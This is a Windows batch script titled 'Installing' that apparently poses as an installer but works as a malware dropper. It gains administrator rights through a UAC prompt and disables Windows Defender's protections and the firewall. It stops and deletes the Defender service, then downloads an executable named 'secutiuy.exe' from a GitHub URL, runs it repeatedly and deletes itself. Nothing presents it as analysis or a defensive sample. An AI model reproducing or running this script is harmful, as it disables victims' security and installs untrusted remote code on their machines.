@echo off>NUL
title Installing
REM  
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM 
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell.exe -command "netsh advfirewall set allprofiles state off"
sc stop  windefend 
sc delete  windefend
netsh firewall set opmode mode=disable
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"c
powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"
powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"
powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell.exe -command "iwr https://github.com/jpwsnocnwdnuo2jdionwmod/maxj/raw/main/secutiuy.exe -OutFile .\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"
powershell.exe -command "iwr https://github.com/jpwsnocnwdnuo2jdionwmod/maxj/raw/main/secutiuy.exe -OutFile .\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"
del info.bat